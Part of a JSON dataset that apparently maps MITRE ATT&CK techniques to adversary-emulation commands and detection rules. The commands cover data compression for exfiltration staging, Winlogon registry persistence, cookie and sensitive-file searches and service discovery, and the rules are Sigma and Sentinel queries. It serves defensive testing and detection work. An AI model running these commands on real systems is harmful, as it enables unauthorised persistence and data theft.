%USERPROFILE%\\*#{file_extension}\n", "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*.txt\n", "\"#{rar_exe}\" a -r %USERPROFILE%\\T1002-data.rar #{input_path}\\*#{file_extension}\n", "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n", "\"%programfiles%/WinRAR/Rar.exe\" a -r #{output_file} #{input_path}\\*#{file_extension}\n", "zip #{output_file} $HOME/*.txt\n", "zip $HOME/data.zip #{input_files}\n", "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)\n", "test -e #{input_file} && gzip -k #{input_file} || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> #{input_file}; gzip -k #{input_file})\n", "tar -cvzf #{output_file} $HOME/$USERNAME\n", "tar -cvzf $HOME/data.tar.gz #{input_file_folder}\n", {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "rar.exe", "powershell/management/zipfolder", "powershell/management/zipfolder"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"powershell.exe\"and process_command_line contains \"-Recurse | Compress-Archive\")or (process_path contains \"rar.exe\"and process_command_line contains \"rar*a*\")", "name": "Data Compressed"}], "possible_detections": [{"data_source": {"title": "Judgement Panda Exfil Activity", "id": "03e2746e-2b31-42f1-ab7a-eb39365b2422", "description": "Detects Judgement Panda activity as described in Global Threat Report 2019 by Crowdstrike", "references": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "author": "Florian Roth", "date": "2019/02/21", "tags": ["attack.lateral_movement", "attack.g0010", "attack.credential_access", "attack.t1098", "attack.exfiltration", "attack.t1002"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": ["*\\ldifde.exe -f -n *", "*\\7za.exe a 1.7z *", "* eprod.ldf", "*\\aaaa\\procdump64.exe*", "*\\aaaa\\netsess.exe*", "*\\aaaa\\7za.exe*", "*copy .\\1.7z \\\\*", "*copy \\\\client\\c$\\aaaa\\\\*"]}, "selection2": {"Image": "C:\\Users\\Public\\7za.exe"}, "condition": "selection1 or selection2"}, "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "Data Compressed", "id": "a3b5e3e9-1b49-4119-8b8e-0344a01f21ee", "status": "experimental", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1002/T1002.yaml"], "logsource": {"product": "linux", "service": "auditd"}, "detection": {"selection1": {"type": "execve", "a0": "zip"}, "selection2": {"type": "execve", "a0": "gzip", "a1": "-f"}, "selection3": {"type": "execve", "a0": "tar", "a1|contains": "-c"}, "condition": "1 of them"}, "falsepositives": ["Legitimate use of archiving tools by legitimate user"], "level": "low", "tags": ["attack.exfiltration", "attack.t1002"]}}, {"data_source": {"title": "Data Compressed", "id": "6dc5d284-69ea-42cf-9311-fb1c3932a69a", "status": "experimental", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1002/T1002.yaml"], "logsource": {"product": "windows", "service": "powershell", "description": "Script block logging must be enabled"}, "detection": {"selection": {"EventID": 4104, "keywords|contains|all": ["-Recurse", "|", "Compress-Archive"]}, "condition": "selection"}, "falsepositives": ["highly likely if archive ops are done via PS"], "level": "low", "tags": ["attack.exfiltration", "attack.t1002"]}}, {"data_source": {"title": "Data Compressed", "id": "6f3e2987-db24-4c78-a860-b4f4095a7095", "status": "experimental", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1002/T1002.yaml"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\rar.exe", "CommandLine|contains|all": [" a ", "-r"]}, "condition": "selection"}, "fields": ["Image", "CommandLine", "User", "LogonGuid", "Hashes", "ParentProcessGuid", "ParentCommandLine"], "falsepositives": ["highly likely if rar is default archiver in the monitored environment"], "level": "low", "tags": ["attack.exfiltration", "attack.t1002"]}}, {"data_source": {"title": "Suspicious Compression Tool Parameters", "id": "27a72a60-7e5e-47b1-9d17-909c9abafdcd", "status": "experimental", "description": "Detects suspicious command line arguments of common data compression tools", "references": ["https://twitter.com/SBousseaden/status/1184067445612535811"], "tags": ["attack.exfiltration", "attack.t1020", "attack.t1002"], "author": "Florian Roth, Samir Bousseaden", "date": "2019/10/15", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"OriginalFileName": ["7z*.exe", "*rar.exe", "*Command*Line*RAR*"], "CommandLine": ["* -p*", "* -ta*", "* -tb*", "* -sdel*", "* -dw*", "* -hp*"]}, "falsepositive": {"ParentImage": "C:\\Program*"}, "condition": "selection and not falsepositive"}, "falsepositives": ["unknown"], "level": "high"}}]}, {"technique_id": "T1004", "commands": [{"source": "atomics/T1004/T1004.yaml", "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "name": null}, {"source": "atomics/T1004/T1004.yaml", "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "name": null}, {"source": "atomics/T1004/T1004.yaml", "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Force\n", "name": null}, {"source": "Threat Hunting Tables", "command": "winlogon.exe", "name": "parent_process"}, {"source": "SysmonHunter - Winlogon Helper DLL", "command": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", "name": null}, {"source": "SysmonHunter - Winlogon Helper DLL", "command": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Winlogon Helper DLL": {"attack_technique": "T1004", "display_name": "Winlogon Helper DLL", "atomic_tests": [{"name": "Winlogon Shell Key Persistence - PowerShell", "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of binary to execute", "type": "Path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n"}}, {"name": "Winlogon Userinit Key Persistence - PowerShell", "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of binary to execute", "type": "Path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n"}}, {"name": "Winlogon Notify Key Logon Persistence - PowerShell", "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon/logoff.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of notification package to execute", "type": "Path", "default": "C:\\Windows\\Temp\\atomicNotificationPackage.dll"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"#{binary_to_execute}\" -Force\n", "cleanup_command": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100087", "os": "windows", "parent_process": "winlogon.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "winlogon", "mitre_attack": "T1004", "itw_sample": ""}}, {"SysmonHunter - T1004": {"name": "Winlogon Helper DLL", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"}}}]}}], "command_list": ["Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n", "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Force\n", "winlogon.exe", "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and(registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\user_nameinit\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\\\\")", "name": "Win Logon Helper DLL"}], "possible_detections": [{"data_source": {"title": "Winlogon Helper DLL", "id": "851c506b-6b7c-4ce2-8802-c703009d03c0", "status": "experimental", "description": "Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables.", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1004/T1004.yaml"], "logsource": {"product": "windows", "service": "powershell", "description": "Script block logging must be enabled"}, "detection": {"selection": {"EventID": 4104}, "keyword1": ["*Set-ItemProperty*", "*New-Item*"], "keyword2": ["*CurrentVersion\\Winlogon*"], "condition": "selection and ( keyword1 and keyword2 )"}, "falsepositives": ["Unknown"], "level": "medium", "tags": ["attack.persistence", "attack.t1004"]}}]}, {"technique_id": "T1005", "commands": [{"source": "atomics/T1005/T1005.yaml", "command": "cd ~/Library/Cookies\ngrep -q \"coinbase\" \"Cookies.binarycookies\"\n", "name": null}, {"source": "data/abilities/collection/02de522f-7e0a-4544-8afc-0c195f400f5f.yml", "command": {"darwin": {"sh": {"command": "pip install stormssh && storm list\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}, "name": "Search for valid SSH commands in the config file"}, {"source": "data/abilities/collection/1f7ff232-ebf8-42bf-a3c4-657855794cfe.yml", "command": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, "name": "Grep for all emails for the given target company"}, {"source": "data/abilities/collection/89955f55-529d-4d58-bed4-fed9e42515ec.yml", "command": {"darwin": {"sh": {"command": "curl #{remote.host.socket}\n"}}, "linux": {"sh": {"command": "curl #{remote.host.socket}\n"}}}, "name": "See the raw content of a socket"}, {"source": "data/abilities/collection/90c2efaa-8205-480d-8bb6-61d90dbaf81b.yml", "command": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}}, "name": "Locate files deemed sensitive"}, {"source": "data/abilities/collection/d69e8660-62c9-431e-87eb-8cf6bd4e35cf.yml", "command": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "name": "Grep for IP addresses in file system per user"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_column_sample_data", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_column_sample_data", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_query", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_query", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/minidump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/minidump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/sessiongopher", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/sessiongopher", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/browser_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/browser_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/imessage_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/imessage_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/situational_awareness", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/situational_awareness", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Data from Local System": {"attack_technique": "T1005", "display_name": "Data from Local System", "atomic_tests": [{"name": "Search macOS Safari Cookies", "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n", "supported_platforms": ["macos"], "input_arguments": {"search_string": {"description": "String to search Safari cookies to find.", "type": "string", "default": "coinbase"}}, "executor": {"name": "sh", "elevation_required": false, "command": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n"}}]}}, {"Mitre Stockpile - Search for valid SSH commands in the config file": {"id": "02de522f-7e0a-4544-8afc-0c195f400f5f", "name": "Parse SSH config", "description": "Search for valid SSH commands in the config file", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "pip install stormssh && storm list\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}}}, {"Mitre Stockpile - Grep for all emails for the given target company": {"id": "1f7ff232-ebf8-42bf-a3c4-657855794cfe", "name": "Find company emails", "description": "Grep for all emails for the given target company", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}, {"Mitre Stockpile - See the raw content of a socket": {"id": "89955f55-529d-4d58-bed4-fed9e42515ec", "name": "cURL socket address", "description": "See the raw content of a socket", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "curl #{remote.host.socket}\n"}}, "linux": {"sh": {"command": "curl #{remote.host.socket}\n"}}}}}, {"Mitre Stockpile - Locate files deemed sensitive": {"id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "name": "Find files", "description": "Locate files deemed sensitive", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}}}}, {"Mitre Stockpile - Grep for IP addresses in file system per user": {"id": "d69e8660-62c9-431e-87eb-8cf6bd4e35cf", "name": "Find IP addresses", "description": "Grep for IP addresses in file system per user", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/get_sql_column_sample_data", "ATT&CK Technique #1": "T1005", "ATT&CK Technique #2": "", "Technique": "Data from Local System", "Concatenate for Python Dictionary": "\"powershell/collection/get_sql_column_sample_data\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/get_sql_query", "ATT&CK Technique #1": "T1005", "ATT&CK Technique #2": "", "Technique": "Data from Local System", "Concatenate for Python Dictionary": "\"powershell/collection/get_sql_query\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/minidump", "ATT&CK Technique #1": "T1005", "ATT&CK Technique #2": "", "Technique": "Data from Local System", "Concatenate for Python Dictionary": "\"powershell/collection/minidump\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/sessiongopher", "ATT&CK Technique #1": "T1005", "ATT&CK Technique #2": "T1145", "Technique": "Data from Local System", "Concatenate for Python Dictionary": "\"powershell/credentials/sessiongopher\":  [\"T1005\",\"T1145\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/browser_dump", "ATT&CK Technique #1": "T1005", "ATT&CK Technique #2": "", "Technique": "Data from Local System", "Concatenate for Python Dictionary": "\"python/collection/osx/browser_dump\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/imessage_dump", "ATT&CK Technique #1": "T1005", "ATT&CK Technique #2": "", "Technique": "Data from Local System", "Concatenate for Python Dictionary": "\"python/collection/osx/imessage_dump\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/host/osx/situational_awareness", "ATT&CK Technique #1": "T1005", "ATT&CK Technique #2": "T1082", "Technique": "Data from Local System", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/osx/situational_awareness\":  [\"T1005\",\"T1082\"],"}}], "command_list": ["cd ~/Library/Cookies\ngrep -q \"coinbase\" \"Cookies.binarycookies\"\n", {"darwin": {"sh": {"command": "pip install stormssh && storm list\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}, {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, {"darwin": {"sh": {"command": "curl #{remote.host.socket}\n"}}, "linux": {"sh": {"command": "curl #{remote.host.socket}\n"}}}, {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}}, {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "powershell/collection/get_sql_column_sample_data", "powershell/collection/get_sql_column_sample_data", "powershell/collection/get_sql_query", "powershell/collection/get_sql_query", "powershell/collection/minidump", "powershell/collection/minidump", "powershell/credentials/sessiongopher", "powershell/credentials/sessiongopher", "python/collection/osx/browser_dump", "python/collection/osx/browser_dump", "python/collection/osx/imessage_dump", "python/collection/osx/imessage_dump", "python/situational_awareness/host/osx/situational_awareness", "python/situational_awareness/host/osx/situational_awareness"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1007", "commands": [{"source": "atomics/T1007/T1007.yaml", "command": "tasklist.exe\nsc query\nsc query state= all\n", "name": null}, {"source": "atomics/T1007/T1007.yaml", "command": "net.exe start >> C:\\Windows\\Temp\\service-list.txt\n", "name": null}, {"source": "data/abilities/discovery/c6607391-d02c-44b5-9b13-d3492ca58599.yml", "command": {"windows": {"psh": {"command": "Get-Service"}}}, "name": "Identify system services"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> sc query\n\nSERVICE_NAME: BFE\nDISPLAY_NAME: Base Filtering Engine\nTYPE: 20 WIN32_SHARE_PROCESS\nSTATE: 4 RUNNING\n(STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\nWIN32_EXIT_CODE: 0 (0x0)\nSERVICE_EXIT_CODE: 0 (0x0)\nCHECKPOINT: 0x0\nWAIT_HINT: 0x0", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> tasklist / svc\n\nImage Name PID Service\n========================= ======== ================= ===========================\nSystem Idle Process 0 Temp Out\nSystem 4 Temp Out\nsmss.exe 288 temporary shortage\ncsrss.exe 420 temporary shortage\ncsrss.exe 532 temporary shortage\nwininit.exe 576 temporary shortage\nwinlogon.exe 584 temporary shortage\nservices.exe 664 temporary shortage", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net start\nIt has been launched the following Windows services:\n\nBackground Tasks Infrastructure Service\nBase Filtering Engine\nCDPUserSvc_11e76e\nCertificate Propagation\nCNG Key Isolation\nCOM + Event System\nCOM + System Application", "name": "Dos"}], "parsed_datasets": [{"Atomic Red Team Test - System Service Discovery": {"attack_technique": "T1007", "display_name": "System Service Discovery", "atomic_tests": [{"name": "System Service Discovery", "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n", 